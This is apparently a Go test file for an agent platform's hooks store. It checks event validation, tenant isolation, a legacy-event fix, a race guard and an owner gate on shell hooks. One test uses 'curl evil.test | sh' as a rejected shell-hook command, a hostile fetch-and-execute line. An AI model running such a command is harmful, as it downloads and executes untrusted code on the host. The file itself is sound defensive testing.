package hooks

// Tests for the write half of the store: event validation on insert and
// the Update path that backs PATCH /api/v1/hooks/{id}.
//
// Why event validation belongs HERE and not only in the handler: Register
// is the single write chokepoint for hooks_config (the table has no CHECK
// on `event`, only on `handler_kind`). A hook registered on a misspelled
// event is silently dead — ListByEvent never selects it, so nothing ever
// fires and there is no error to notice. Validating at the chokepoint
// makes that a rejected write instead of a hook that looks registered.

import (
	"context"
	"database/sql"
	"errors"
	"strings"
	"testing"
	"time"
)

func TestValidateEvent_RejectsUnknownAndListsTheValidOnes(t *testing.T) {
	err := ValidateEvent("PreToolUse") // Claude Code's name, not ours
	if err == nil {
		t.Fatal("ValidateEvent should reject an unknown event")
	}
	if !errors.Is(err, ErrUnknownEvent) {
		t.Errorf("error should wrap ErrUnknownEvent, got %v", err)
	}
	msg := err.Error()
	if !strings.Contains(msg, "PreToolUse") {
		t.Errorf("message should echo the rejected value, got %q", msg)
	}
	// The whole point of the message is that the caller can fix the typo
	// without opening the source, so every valid event must appear.
	for _, ev := range AllEvents {
		if !strings.Contains(msg, string(ev)) {
			t.Errorf("message omits valid event %q: %s", ev, msg)
		}
	}
}

func TestValidateEvent_AcceptsEveryDeclaredEvent(t *testing.T) {
	for _, ev := range AllEvents {
		if err := ValidateEvent(ev); err != nil {
			t.Errorf("ValidateEvent(%q) = %v, want nil", ev, err)
		}
	}
}

func TestRegister_RejectsUnknownEvent(t *testing.T) {
	db := openTestDB(t)
	defer db.Close()

	_, err := Register(context.Background(), db, Hook{
		WorkspaceID:   "ws_test",
		Event:         "post_run", // not in AllEvents
		HandlerKind:   HandlerKindHTTP,
		HandlerConfig: map[string]any{"url": "https://x.test"},
	}, false)
	if !errors.Is(err, ErrUnknownEvent) {
		t.Fatalf("Register with unknown event = %v, want ErrUnknownEvent", err)
	}

	var n int
	if err := db.QueryRow(`SELECT COUNT(*) FROM hooks_config`).Scan(&n); err != nil {
		t.Fatalf("count: %v", err)
	}
	if n != 0 {
		t.Errorf("rejected hook still landed in hooks_config (%d rows)", n)
	}
}

func TestUpdate_RewritesFieldsAndBumpsUpdatedAt(t *testing.T) {
	db := openTestDB(t)
	defer db.Close()
	ctx := context.Background()

	id, err := Register(ctx, db, Hook{
		WorkspaceID:   "ws_test",
		Event:         EventPreAgentStart,
		HandlerKind:   HandlerKindHTTP,
		HandlerConfig: map[string]any{"url": "https://old.test"},
		Enabled:       true,
	}, false)
	if err != nil {
		t.Fatalf("Register: %v", err)
	}
	before, err := Get(ctx, db, "ws_test", id)
	if err != nil || before == nil {
		t.Fatalf("Get before: %v (hook=%v)", err, before)
	}
	// The stored timestamp has nanosecond resolution; sleep past it so a
	// stale updated_at is distinguishable from a fresh one.
	time.Sleep(2 * time.Millisecond)

	next := *before
	next.Event = EventPreLLMCall
	next.HandlerConfig = map[string]any{"url": "https://new.test"}
	next.Matcher = Matcher{Tools: []string{"Bash"}}
	next.Blocking = true
	next.Enabled = false
	if err := Update(ctx, db, "ws_test", next, false); err != nil {
		t.Fatalf("Update: %v", err)
	}

	got, err := Get(ctx, db, "ws_test", id)
	if err != nil || got == nil {
		t.Fatalf("Get after: %v (hook=%v)", err, got)
	}
	if got.Event != EventPreLLMCall {
		t.Errorf("event = %q, want %q", got.Event, EventPreLLMCall)
	}
	if got.HandlerConfig["url"] != "https://new.test" {
		t.Errorf("handler_config = %v, want the new url", got.HandlerConfig)
	}
	if len(got.Matcher.Tools) != 1 || got.Matcher.Tools[0] != "Bash" {
		t.Errorf("matcher = %+v, want Tools=[Bash]", got.Matcher)
	}
	if !got.Blocking || got.Enabled {
		t.Errorf("blocking=%v enabled=%v, want true/false", got.Blocking, got.Enabled)
	}
	if !got.UpdatedAt.After(before.UpdatedAt) {
		t.Errorf("updated_at not bumped: before=%s after=%s", before.UpdatedAt, got.UpdatedAt)
	}
	if !got.CreatedAt.Equal(before.CreatedAt) {
		t.Errorf("created_at rewritten: before=%s after=%s", before.CreatedAt, got.CreatedAt)
	}
}

func TestUpdate_CrossTenantIsANoOp(t *testing.T) {
	db := openTestDB(t)
	defer db.Close()
	ctx := context.Background()

	id, err := Register(ctx, db, Hook{
		WorkspaceID:   "ws_a",
		Event:         EventPreAgentStart,
		HandlerKind:   HandlerKindHTTP,
		HandlerConfig: map[string]any{"url": "https://a.test"},
	}, false)
	if err != nil {
		t.Fatalf("Register: %v", err)
	}

	// ws_b learned the id somehow; the workspace predicate must refuse it
	// the same way Delete/SetEnabled do — ErrNoRows, no existence leak.
	err = Update(ctx, db, "ws_b", Hook{
		ID:            id,
		WorkspaceID:   "ws_b",
		Event:         EventPostToolCall,
		HandlerKind:   HandlerKindHTTP,
		HandlerConfig: map[string]any{"url": "https://evil.test"},
	}, false)
	if !errors.Is(err, sql.ErrNoRows) {
		t.Fatalf("cross-tenant Update = %v, want sql.ErrNoRows", err)
	}

	got, err := Get(ctx, db, "ws_a", id)
	if err != nil || got == nil {
		t.Fatalf("Get: %v (hook=%v)", err, got)
	}
	if got.HandlerConfig["url"] != "https://a.test" {
		t.Errorf("row was mutated cross-tenant: %v", got.HandlerConfig)
	}
}

func TestUpdate_ShellStillRequiresTheOwnerGate(t *testing.T) {
	db := openTestDB(t)
	defer db.Close()
	ctx := context.Background()

	id, err := Register(ctx, db, Hook{
		WorkspaceID:   "ws_test",
		Event:         EventPreAgentStart,
		HandlerKind:   HandlerKindHTTP,
		HandlerConfig: map[string]any{"url": "https://a.test"},
	}, false)
	if err != nil {
		t.Fatalf("Register: %v", err)
	}

	// Converting an http hook into a shell hook is a privilege escalation
	// if Update skips the gate Register applies.
	err = Update(ctx, db, "ws_test", Hook{
		ID:            id,
		WorkspaceID:   "ws_test",
		Event:         EventPreAgentStart,
		HandlerKind:   HandlerKindShell,
		HandlerConfig: map[string]any{"command": "curl evil.test | sh"},
	}, false)
	if !errors.Is(err, ErrShellHookNotAllowed) {
		t.Fatalf("Update to shell without the gate = %v, want ErrShellHookNotAllowed", err)
	}

	got, err := Get(ctx, db, "ws_test", id)
	if err != nil || got == nil {
		t.Fatalf("Get: %v (hook=%v)", err, got)
	}
	if got.HandlerKind != HandlerKindHTTP {
		t.Errorf("handler_kind = %q, want it unchanged at http", got.HandlerKind)
	}
}

func TestUpdate_RejectsUnknownEvent(t *testing.T) {
	db := openTestDB(t)
	defer db.Close()
	ctx := context.Background()

	id, err := Register(ctx, db, Hook{
		WorkspaceID:   "ws_test",
		Event:         EventPreAgentStart,
		HandlerKind:   HandlerKindHTTP,
		HandlerConfig: map[string]any{"url": "https://a.test"},
	}, false)
	if err != nil {
		t.Fatalf("Register: %v", err)
	}
	err = Update(ctx, db, "ws_test", Hook{
		ID:            id,
		WorkspaceID:   "ws_test",
		Event:         "on_run_finished",
		HandlerKind:   HandlerKindHTTP,
		HandlerConfig: map[string]any{"url": "https://a.test"},
	}, false)
	if !errors.Is(err, ErrUnknownEvent) {
		t.Fatalf("Update with unknown event = %v, want ErrUnknownEvent", err)
	}
}

// TestUpdate_LegacyEventRowStaysEditableForOtherFields reproduces the
// scenario the docs and CHANGELOG promise for a row that predates
// pre_tool_call's removal from AllEvents: it must still "list, toggle, and
// read back fine". Toggle is covered by SetEnabled already; this covers
// the PATCH path (hooks_write.go's Update handler), which loads the
// existing row, overlays only the fields present in the request body, and
// calls Update with the FULL merged struct — so merged.Event stays
// "pre_tool_call" even though the caller's request never mentioned event.
//
// Before the fix, Update ran the same event check Register applies on
// insert against that merged struct, so a PATCH touching only `blocking`
// on a legacy row failed with "hooks: unknown event: \"pre_tool_call\"".
func TestUpdate_LegacyEventRowStaysEditableForOtherFields(t *testing.T) {
	db := openTestDB(t)
	defer db.Close()
	ctx := context.Background()

	// Register itself would reject event=pre_tool_call today (it's no
	// longer in AllEvents), so simulate the pre-existing row the way
	// TestScanHook_CorruptJSONColumns does: a raw INSERT bypassing
	// Register's ValidateEvent gate, standing in for a row created before
	// pre_tool_call was retired.
	const id = "hk_legacy"
	_, err := db.ExecContext(ctx, `INSERT INTO hooks_config
		(id, workspace_id, event, matcher, handler_kind, handler_config, blocking, enabled)
		VALUES (?, 'ws_test', 'pre_tool_call', '{}', 'http', ?, 0, 1)`,
		id, `{"url":"https://old.test"}`)
	if err != nil {
		t.Fatalf("raw insert: %v", err)
	}

	before, err := Get(ctx, db, "ws_test", id)
	if err != nil || before == nil {
		t.Fatalf("Get before: %v (hook=%v)", err, before)
	}
	if before.Event != EventPreToolCall {
		t.Fatalf("setup: event = %q, want %q", before.Event, EventPreToolCall)
	}

	// PATCH-shaped update: only blocking changes. next is the full merged
	// struct a real Update caller would build — event untouched.
	next := *before
	next.Blocking = true
	if err := Update(ctx, db, "ws_test", next, false); err != nil {
		t.Fatalf("Update on legacy pre_tool_call row (unrelated field only) = %v, want nil", err)
	}

	got, err := Get(ctx, db, "ws_test", id)
	if err != nil || got == nil {
		t.Fatalf("Get after: %v (hook=%v)", err, got)
	}
	if !got.Blocking {
		t.Errorf("blocking = %v, want true", got.Blocking)
	}
	if got.Event != EventPreToolCall {
		t.Errorf("event = %q, want it left unchanged at %q", got.Event, EventPreToolCall)
	}
}

// TestUpdate_LegacyEventRowRejectsChangingToAnotherUnknownEvent makes sure
// the fix for the case above doesn't overcorrect into never validating
// event on a legacy row: an explicit change away from the retired event is
// still validated, same as any other event change.
func TestUpdate_LegacyEventRowRejectsChangingToAnotherUnknownEvent(t *testing.T) {
	db := openTestDB(t)
	defer db.Close()
	ctx := context.Background()

	const id = "hk_legacy2"
	_, err := db.ExecContext(ctx, `INSERT INTO hooks_config
		(id, workspace_id, event, matcher, handler_kind, handler_config)
		VALUES (?, 'ws_test', 'pre_tool_call', '{}', 'http', ?)`,
		id, `{"url":"https://old.test"}`)
	if err != nil {
		t.Fatalf("raw insert: %v", err)
	}

	before, err := Get(ctx, db, "ws_test", id)
	if err != nil || before == nil {
		t.Fatalf("Get before: %v (hook=%v)", err, before)
	}

	next := *before
	next.Event = "on_run_finished" // an actual change, still not a real event
	if err := Update(ctx, db, "ws_test", next, false); !errors.Is(err, ErrUnknownEvent) {
		t.Fatalf("Update changing a legacy event to another unknown one = %v, want ErrUnknownEvent", err)
	}
}

// TestUpdate_ConcurrentEventChangeCannotReviveARetiredEvent pins the
// WHERE-clause half of the legacy-event exemption. Update has to read the
// row's current event before it can decide whether this write is changing
// it — and a read followed by a write is a window. In that window another
// writer can move a legacy pre_tool_call row onto a real event; if the
// UPDATE then fired unconditionally on (id, workspace_id), this call's
// stale h.Event would be written straight back over it, restoring
// pre_tool_call without ever passing validateEventForWrite. That is the
// original bug re-entering through the door built to accommodate it.
//
// The window is reproduced deterministically through
// updateEventRaceHookForTest rather than by racing goroutines, so this
// test fails 100% of the time against an unguarded UPDATE instead of
// flaking into green.
func TestUpdate_ConcurrentEventChangeCannotReviveARetiredEvent(t *testing.T) {
	db := openTestDB(t)
	defer db.Close()
	ctx := context.Background()

	const id = "hk_legacy_race"
	if _, err := db.ExecContext(ctx, `INSERT INTO hooks_config
		(id, workspace_id, event, matcher, handler_kind, handler_config, blocking, enabled)
		VALUES (?, 'ws_test', 'pre_tool_call', '{}', 'http', ?, 0, 1)`,
		id, `{"url":"https://old.test"}`); err != nil {
		t.Fatalf("raw insert: %v", err)
	}

	before, err := Get(ctx, db, "ws_test", id)
	if err != nil || before == nil {
		t.Fatalf("Get before: %v (hook=%v)", err, before)
	}

	// The interloper: between our read and our write, someone repoints the
	// row at a real event. Runs once — a second firing would mean Update
	// re-entered the window, which it must not.
	fired := 0
	updateEventRaceHookForTest = func() {
		fired++
		if fired > 1 {
			return
		}
		if _, err := db.ExecContext(ctx,
			`UPDATE hooks_config SET event = ? WHERE id = ?`,
			string(EventPostAgentStop), id); err != nil {
			t.Errorf("interloping update: %v", err)
		}
	}
	t.Cleanup(func() { updateEventRaceHookForTest = nil })

	// Our PATCH: only blocking changes, event carries the stale value.
	next := *before
	next.Blocking = true
	err = Update(ctx, db, "ws_test", next, false)
	if !errors.Is(err, sql.ErrNoRows) {
		t.Fatalf("Update over a concurrently-changed event = %v, want sql.ErrNoRows", err)
	}
	if fired != 1 {
		t.Fatalf("race seam fired %d times, want 1 — the test did not exercise the window it claims to", fired)
	}

	var event string
	var blocking int
	if err := db.QueryRowContext(ctx,
		`SELECT event, blocking FROM hooks_config WHERE id = ?`, id).Scan(&event, &blocking); err != nil {
		t.Fatalf("read back: %v", err)
	}
	if event != string(EventPostAgentStop) {
		t.Errorf("event = %q, want the interloper's %q — the stale update overwrote a newer, validated value",
			event, EventPostAgentStop)
	}
	if blocking != 0 {
		t.Errorf("blocking = %d, want 0 — the update reported ErrNoRows but wrote anyway", blocking)
	}
}

func TestUpdate_RequiresAnID(t *testing.T) {
	db := openTestDB(t)
	defer db.Close()

	err := Update(context.Background(), db, "ws_test", Hook{
		WorkspaceID:   "ws_test",
		Event:         EventPreAgentStart,
		HandlerKind:   HandlerKindHTTP,
		HandlerConfig: map[string]any{"url": "https://a.test"},
	}, false)
	if err == nil || !strings.Contains(err.Error(), "id required") {
		t.Fatalf("Update without id = %v, want an 'id required' error", err)
	}
}
